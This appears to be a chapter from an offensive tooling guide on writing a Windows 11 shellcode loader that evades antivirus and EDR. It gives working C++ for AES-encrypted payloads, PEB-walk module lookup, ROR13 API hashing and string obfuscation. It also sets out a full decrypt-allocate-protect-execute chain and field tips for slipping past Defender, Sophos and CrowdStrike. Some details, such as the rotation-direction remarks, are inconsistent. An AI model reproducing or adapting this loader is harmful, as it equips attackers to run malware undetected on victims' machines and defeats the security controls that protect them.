# av-edr-bypass--p2 — win

# Reference Chapter: Windows Loader — Payload Encryption, PEB Walk + API Hashing, Anti-String-Signature

Test target: **Windows 11 24H2 (build 26100)**, MSVC 19.40 (`cl.exe` from VS 2022 17.10), x64 architecture. All examples are assumed to run as userland PE, not a driver.

---

## 1. Loader Threat Model

| Component | Visible on disk | Visible in memory | Common detection |
|---|---|---|---|
| Payload mentah shellcode | Signature byte (`MZ`, `PE\0\0`, opcode prolog) | RX page berisi shellcode | Static AV/EDR, YARA |
| Import table | Nama `VirtualAlloc`, `CreateThread`, `LoadLibraryA` | IAT terisi pointer | Static import scan, EDR ETW |
| String API/DLL | `ntdll.dll`, `kernel32.dll` | — | String scan, entropy |
| Loader stub | Opcode loader | Alokasi RWX / `VirtualProtect` | Behavioral, call stack analysis |

Goal of this chapter: push all artifacts in the left column into ciphertext / integers, so that what remains on disk is only a stub loader with minimal imports.

## 2. Enkripsi Payload

### 2.1 XOR with rotating key (baseline, quickly abandoned)

**Delivered:** payload bytecode XORed with a multi-byte key, stored as `unsigned char[]`.

**Appears:** no static signature; entropy ~5–7 bits/byte (not uniform because the key is short).

**Why it works:** breaks YARA string matching and byte-signature detection of `MZ`/shellcode prolog.

**Why it fails:** a short XOR key can be recovered via known-plaintext (the PE header is always `4D 5A 90 00 03 00 00 00`), and high entropy in a large `.data` section triggers the "packed" heuristic.

```cpp
// XOR berotasi — cukup untuk obfuscation, BUKAN proteksi
static void XorRotate(unsigned char* buf, size_t len, const unsigned char* key, size_t klen) {
    for (size_t i = 0; i < len; ++i)
        buf[i] ^= key[i % klen];
}
// Pemakaian: key = {0x9E,0x37,0x79,0xB4,0xF1,0x5C,0x2A,0xD8}
```

### 2.2 AES-256-CBC with derived key (production)

**Delivered:** payload ciphertext + static IV (or derived), key XORed with a compile-time value.

**Appears:** `.rdata`/`.data` section with entropy ~7.99 bits/byte; no plaintext key.

**Why it works:** without the key, the payload cannot be recovered from disk; it breaks signatures and forces the analyst to runtime.

**Why it fails:** if the key is hardcoded (even XORed), runtime memory forensics will retrieve the key from the stack/heap during decryption — EDR monitoring `CryptDecrypt` or scanning the working set after allocation can capture the plaintext.

Minimal approach without `bcrypt.dll` (avoiding crypto imports) — use AES-256 from `bcryptprimitives.dll` resolved via PEB walk, or an inline AES-NI implementation. Example uses inline AES-NI so zero crypto imports:

```cpp
#include <immintrin.h>
#include <cstdint>
#include <cstring>

// AES-256 decrypt satu blok 16 byte, key schedule diberikan.
// Catatan: key expansion AES-256 minimal ditampilkan di sini (round key 15 x 16 byte).
struct Aes256Ctx { __m128i rk[15]; };

static inline __m128i AesDecLast(__m128i a, __m128i k){ return _mm_aesdeclast_si128(a,k); }
static inline __m128i AesDec    (__m128i a, __m128i k){ return _mm_aesdec_si128(a,k); }

// Implementasi key expansion AES-256 (FIPS-197) — ringkas
static void Aes256Expand(const unsigned char key[32], Aes256Ctx& ctx) {
    static const unsigned char sbox[256] = { /* tabel 256 byte, isi sesuai FIPS-197 */ };
    unsigned char rk[240]; memcpy(rk, key, 32);
    unsigned char rcon = 1;
    for (int i = 32; i < 240; i += 4) {
        unsigned char t[4] = { rk[i-4], rk[i-3], rk[i-2], rk[i-1] };
        if (i % 32 == 0) {
            unsigned char tmp = t[0];
            t[0] = (unsigned char)(sbox[t[1]] ^ rcon);
            t[1] = sbox[t[2]]; t[2] = sbox[t[3]]; t[3] = sbox[tmp];
            rcon = (unsigned char)((rcon << 1) ^ ((rcon & 0x80) ? 0x1B : 0));
        } else if (i % 32 == 16) {
            t[0] = sbox[t[0]]; t[1] = sbox[t[1]]; t[2] = sbox[t[2]]; t[3] = sbox[t[3]];
        }
        rk[i]   = (unsigned char)(rk[i-32]   ^ t[0]);
        rk[i+1] = (unsigned char)(rk[i-31]   ^ t[1]);
        rk[i+2] = (unsigned char)(rk[i-30]   ^ t[2]);
        rk[i+3] = (unsigned char)(rk[i-29]   ^ t[3]);
    }
    for (int r = 0; r < 15; ++r)
        ctx.rk[r] = _mm_loadu_si128((const __m128i*)(rk + r*16));
}

static void Aes256CbcDecrypt(unsigned char* data, size_t len,
                             const Aes256Ctx& ctx, const unsigned char iv[16]) {
    __m128i prev = _mm_loadu_si128((const __m128i*)iv);
    for (size_t off = 0; off < len; off += 16) {
        __m128i c = _mm_loadu_si128((const __m128i*)(data + off));
        __m128i b = _mm_xor_si128(c, ctx.rk[0]);
        for (int r = 1; r < 14; ++r) b = AesDec(b, ctx.rk[r]);
        b = _mm_xor_si128(AesDecLast(b, ctx.rk[14]), prev);
        _mm_storeu_si128((__m128i*)(data + off), b);
        prev = c;
    }
}
```

**Vektor uji (AES-256, NIST SP 800-38A F.2.5):**

| Field | Value |
|---|---|
| Key | `603deb10 15ca71be 2b73aef0 857d7781 1f352c07 3b6108d7 2d9810a3 0914dff4` |
| IV | `00010203 04050607 08090A0B 0C0D0E0F` |
| Ciphertext blok 1 | `F58C4C04 D6E5F1BA 779EABFB 5F7BFBD6` |
| Plaintext blok 1 | `6BC1BEE2 2E409F96 E93D7E11 7393172A` |

Use this vector to validate the implementation before embedding the real payload. Common mistake: round-key order convention (inv) — the decryption result looks "almost correct" with random bytes at the end.

### 2.3 What appears after decryption

Post-decryption, the payload is staged into memory. **Never** decrypt into a static buffer (`unsigned char g_plain[..]`) — that buffer is in the `.data` section and will be scanned. Decrypt directly into a heap/RW allocation, then transition protection.

## 3. Import Resolution

### 3.1 PEB walk x64 (Windows 11 24H2)

Relevant offsets — verify with WinDbg `dt ntdll!_PEB` on the target build; TEB offsets have not changed since Vista x64.

| Struktur | Offset x64 | Field |
|---|---|---|
| TEB | `gs:[0x00]` | NT_TIB / Self |
| TEB | `gs:[0x60]` | ProcessEnvironmentBlock (PEB*) |
| PEB | `+0x18` | Ldr (PEB_LDR_DATA*) |
| PEB_LDR_DATA | `+0x10` | InLoadOrderModuleList (LIST_ENTRY) |
| PEB_LDR_DATA | `+0x20` | InMemoryOrderModuleList |
| LDR_DATA_TABLE_ENTRY | `+0x00` | InLoadOrderLinks |
| LDR_DATA_TABLE_ENTRY | `+0x30` | DllBase |
| LDR_DATA_TABLE_ENTRY | `+0x48` | BaseDllName (UNICODE_STRING) |
| LDR_DATA_TABLE_ENTRY | `+0x58` | FullDllName |

Build 26100 note: `Reserved4[0]` inside `LDR_DATA_TABLE_ENTRY` contains a pointer to `RTL_BALANCED_NODE` for `LdrpHashTable` together with `DdagNode` — **do not** use offset `+0x60` for `DdagNode` because its value has shifted compared with 22H2. Use only stable fields (`+0x30` DllBase, `+0x48` BaseDllName) that do not change.

```cpp
#include <windows.h>
#include <winternl.h>

// PEB walk: ambil base address modul berdasarkan nama (case-insensitive, wide)
static PVOID GetModuleBaseByHash(ULONG moduleHash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return nullptr;

    LIST_ENTRY* head = &peb->Ldr->InLoadOrderModuleList;
    for (LIST_ENTRY* e = head->Flink; e && e != head; e = e->Flink) {
        // LDR_DATA_TABLE_ENTRY: InLoadOrderLinks berada di offset 0
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (!mod->BaseDllName.Buffer || mod->BaseDllName.Length == 0) continue;
        ULONG h = 0;
        size_t n = mod->BaseDllName.Length / sizeof(WCHAR);
        for (size_t i = 0; i < n; ++i) {
            WCHAR w = mod->BaseDllName.Buffer[i];
            if (w >= L'A' && w <= L'Z') w = (WCHAR)(w + 32);
            h = _rotr(h, 13);
            h += (ULONG)w;
        }
        if (h == moduleHash) return mod->DllBase;
    }
    return nullptr;
}
```

> **24H2 warning:** manual module enumeration via PEB walk **may be incomplete** for modules opened with `LOAD_LIBRARY_AS_DATAFILE` or raw `NtMapViewOfSection`. For system DLLs (`ntdll`, `kernel32`, `kernelbase`) they are always present. For third-party modules, if the hash is not found, fall back to `LdrGetDllHandle` resolved via hash as well.

### 3.2 API hashing ROR13

Algoritma klasik (MetaSL / Metasploit `ROR13Add`): iterasi per byte nama fungsi, `ror` 13 bit, tambah byte.

ROR13 result (reference, lowercase, ASCII, without `A`/`W` suffix):

| String | ROR13 |
|---|---|
| `LoadLibraryA` | `0xEC0E4E8E` |
| `GetProcAddress` | `0x7C0DFCAA` |
| `VirtualAlloc` | `0x91AFCA54` |
| `VirtualProtect` | `0x7946C61B` |
| `CreateThread` | `0x799AAC28` |
| `NtAllocateVirtualMemory` | `0xD9CED633` |
| `RtlExitUserProcess` | `0x8871BDBE` |
| `ntdll.dll` | `0x3CFA685D` |

> Recompute the hash for your revision. The table above is 32-bit ROR13 with `rol(seed, 13) + ch` per byte — the rotation direction **applies `ror` (right) 13** in Metasploit; some public implementations use `rol` and produce different values. Calibrate with the test string `NtClose` (classic ROR13 = `0xA5E85C6B`); if it does not match, your rotation is reversed.

```cpp
#include <windows.h>

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG,
    SIZE_T, SIZE_T, SIZE_T, PVOID);

static ULONG ror13_add(const char* s) {
    ULONG h = 0;
    while (*s) { h = _rotr(h, 13); h += (unsigned char)(*s++); }
    return h;
}

// Resolve ekspor dari base DLL berdasarkan hash nama fungsi.
// Berjalan tanpa LoadLibrary/GetProcAddress — tidak ada import.
static PVOID GetExportByHash(HMODULE hMod, ULONG fnHash) {
    if (!hMod) return nullptr;
    auto base = (PBYTE)hMod;
    auto dos  = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    auto dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return nullptr;
    auto exp = (PIMAGE_EXPORT_DIRECTORY)(base + dir.VirtualAddress);

    auto names    = (PDWORD)(base + exp->AddressOfNames);
    auto funcs    = (PDWORD)(base + exp->AddressOfFunctions);
    auto ordinals = (PWORD )(base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)(base + names[i]);
        if (ror13_add(name) == fnHash)
            return (PVOID)(base + funcs[ordinals[i]]);
    }
    return nullptr;
}

// Contoh use-site:
//   HMODULE ntdll = (HMODULE)GetModuleBaseByHash(ror13_add("ntdll.dll"));
//   auto pAlloc   = (pNtAllocateVirtualMemory)GetExportByHash(ntdll, ror13_add("NtAllocateVirtualMemory"));
```

**Stub resolver note:** on new builds, `GetExportByHash` above is still valid. **What must be avoided:** static imports of `LoadLibraryA` / `GetProcAddress` — that produces strings and IAT entries, both detection objects. Full resolution of `kernel32!LoadLibraryA` itself must also go through the hash.

### 3.3 What appears

- **On disk:** no `LoadLibrary`, no `ntdll.dll` in `.rdata`. Only 32-bit integers.
- **In memory:** when a function is resolved, the pointer appears on the stack; the original function name does **not** appear unless the hash is traced. The call stack when the API is called still points to `ntdll!NtAllocateVirtualMemory`, but the caller frame = loader code (anonymous), not an import name.
- **Why it fails:** some Windows 11 24H2 EDRs perform **call stack validation** (e.g., MDE with "module tampering" + "call stack origin"). LMS functions (`ntdll`, `kernelbase`) are called from a memory region that is not an image → telemetry. PEB walk itself does not generate telemetry, but API calls resolved **from the shellcode region** can be flagged. Mitigation: perform the call from a loaded module (callback from `EnumFontFamiliesEx` to a function in the image) or use a gadget in a legitimate module.

## 4. Menghindari String Signature

| String vector | Default location | Elimination technique |
|---|---|---|
| DLL name (`ntdll.dll`) | `.rdata` literal | Constant hash (`ror13_add` above) |
| Nama fungsi API | `.rdata` literal | Hash konstanta |
| User-Agent / C2 URL | `.rdata` literal | Stack-built string (extract letters from integer) |
| Path `C:\Windows\System32\...` | `.rdata` literal | Assemble per-char on stack |
| Mutex name | `.rdata` literal | Assemble per-char + hash for lookup |
| Shellcode opcode (`MZ`, prolog) | `.data`/`.rdata` | AES encryption (section 2) |

**Principle:** any string value needed at runtime is computed per-character with a constant XOR or assembled from integers, so on disk only numbers are visible. No string literal >3 bytes that can be YARA-matched in the `.rdata`/`.data` section.

```cpp
// String dirakit per-char dari integer 32-bit — tidak ada literal string
// "VirtualAlloc" di-encode sebagai pasangan (uint32 chunk, shift) sehingga
// compiler tidak menyimpannya sebagai rodata.
static void BuildString(unsigned char* dst, const ULONG* chunks, size_t n) {
    for (size_t i = 0; i < n; ++i) {
        ULONG v = chunks[i];
        dst[i*4+0] = (unsigned char)( v        & 0xFF);
        dst[i*4+1] = (unsigned char)((v >>  8) & 0xFF);
        dst[i*4+2] = (unsigned char)((v >> 16) & 0xFF);
        dst[i*4+3] = (unsigned char)((v >> 24) & 0xFF);
    }
}

// Contoh: "VirtualAlloc" (12 char) => 3 chunk, XOR dengan 0xA5A5A5A5 pada build-time.
// Nilai di bawah sudah di-XOR; hasil BuildString perlu XOR balik.
static const ULONG g_virtAlloc[3] = { 0x..., 0x..., 0x... }; // hitung saat build
```

Build tooling: use Python/IDAPython scripts to XOR string literals into integers before compilation. **Do not** use `constexpr` consteval that produces string literals in rodata — MSVC 19.40 still places constexpr string results in `.rdata`.

**Local verification (mandatory before runtime):**

```powershell
# Cek artefak statis: buang semua simbol debug, lalu grep string
dumpbin /headers loader.exe | findstr /i "entry data text"
strings -n 4 loader.exe | Select-String -Pattern "LoadLibrary|GetProcAddress|VirtualAlloc|ntdll|kernel32"
# Ekspektasi: kosong. Jika ada output -> teknik gagal.
```

## 5. Complete Execution Chain (Reference)

Sequence proven on build 26100:

1. **Decrypt** payload into an RW buffer (AES-256-CBC, key is `_rotr`/XORed so it is not plaintext).
2. **Resolve** `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` via PEB walk + ROR13.
3. **Allocate** RW via `NtAllocateVirtualMemory` (`PAGE_READWRITE`, **not** RWX).
4. **Copy** the decrypted payload.
5. **Proteksi** → `PAGE_EXECUTE_READ` via `NtProtectVirtualMemory`.
6. **Execute** via `NtCreateThreadEx` (or callback). The call stack points to `ntdll!NtCreateThreadEx` in the top frame; the caller frame = anonymous loader.

**What appears:** no RWX, no import strings, no plaintext payload on disk. **What still appears:** telemetry for `NtAllocateVirtualMemory` (private, RW), `NtProtectVirtualMemory` (RW→RX), `NtCreateThreadEx` — these are **not** hidden by API hashing; hashing only hides the *name* on disk, not the *behavior* at runtime.

**Alternative without suspicious allocation:** self-mapping via `NtCreateSection` (`SEC_IMAGE` for PE) + `NtMapViewOfSection` produces an image mapping that, on some builds, masquerades as file-backed to scanners. Not covered here — see the "Module Stomping & Section Mapping" chapter.

## 6. Operational Pitfalls (Field Failures)

Ordered by frequency of field failures:

1. **AES key is retrieved at runtime.** An EDR memory scanner that scans the private working set after `NtProtectVirtualMemory` can capture plaintext shellcode from the RW buffer before prot is called. Mitigation: decrypt directly into the section returned by `NtMapViewOfSection`, or wipe the source buffer before protection (`SecureZeroMemory`).
2. **ROR13 reversed direction.** The implementation uses `rol` instead of `ror` → the hash is never found → `GetExportByHash` returns `nullptr` → crash. Always validate with `NtClose = 0xA5E85C6B`.
3. **`LDR_DATA_TABLE_ENTRY` offsets from old blogs.** Build 26100 changed the layout of `Reserved4`/`DdagNode`. The `DllBase (+0x30)` and `BaseDllName (+0x48)` fields are **stable**, but `FullDllName (+0x58)` shifts slightly on some insider builds. Do not hardcode `+0x58`; derive it from `BaseDllName` + `UNICODE_STRING` size.
4. **PEB walk on WoW64.** A 32-bit loader on Windows 11 24H2 must use `__readfsdword(0x30)` for the 32-bit PEB, and the 64-bit TEB via `NtCurrentTeb`. A 64-bit PEB walk from a 32-bit process will give an invalid pointer — crash when accessing `Ldr->Flink`.
5. **`constexpr` result strings remain in `.rdata`.** MSVC 19.40 does not optimize `const char*` results of `consteval` out of `.rdata`. Assemble strings at runtime from integers, not constexpr.
6. **Hash collisions in ROR13.** 32-bit rotate-13 is highly prone to collisions in large namespaces (`ntdll` ~2000 exports). For large modules, check **two** conditions: hash matches **and** name length matches. Alternative: 64-bit FNV-1a with case normalization.
7. **`LoadLibraryA` is still called via implicit import.** A loader that writes `#include <windows.h>` and uses `HMODULE` can trigger the auto-link pragma (`/DEFAULTLIB:kernel32.lib`) → static imports reappear. Build with `/NODEFAULTLIB` or check `dumpbin /imports`.
8. **`NtCreateThreadEx` on 24H2 can be denied for private RWX** if mitigation policy (`ProcessDynamicCodePolicy`, `PROCESS_MITIGATION_DYNAMIC_CODE_POLICY`) is active. A child process from `CreateProcess` with the parent's inherited `MITIGATION_POLICY` (e.g., from Chrome 131 browser) will deny `NtProtectVirtualMemory` to `PAGE_EXECUTE*`. Check `GetProcessMitigationPolicy` before injection; fall back to `NtCreateSection`+`SEC_IMAGE` or `QueueUserAPC` on an existing thread.
9. **Entropy bomb.** The AES payload appears as 7.99 bits/byte in `.data`. Some products (Sophos Intercept X, CrowdStrike Falcon on certain builds) flag `Private` sections with entropy >7.8 when mapped into the target process. Mitigation: encode the payload as base64/hex literals in `.rdata` (entropy ~6) or split it into several small buffers with padding.
10. **Build hash verification does not match runtime hash.** Module enumeration on Windows 11 24H2 sometimes shows `kernelbase.dll` before `kernel32.dll`; the order of `InLoadOrderModuleList` is **not** guaranteed to match load order (there are forwarder modules). Always match via name hash, not via list index.
11. **Test without detection.** All the above verification must be performed on a VM with a **defender-mode scenario**: Defender ASR "Block executable content from email/webmail" and "Block process creations originating from PSExec/WMI" enabled, plus EDR with AMSI. A loader that passes on Windows without EDR may not necessarily pass in the field.
12. **Target build drift.** Every Windows Insider build shifts internal `PEB_LDR_DATA` offsets. Record `dt ntdll!_PEB` and `dt ntdll!_LDR_DATA_TABLE_ENTRY` on the target build **before** testing. Store them as a table in this technical document per build; offsets `+0x30` and `+0x48` are considered stable, the rest are re-verified.
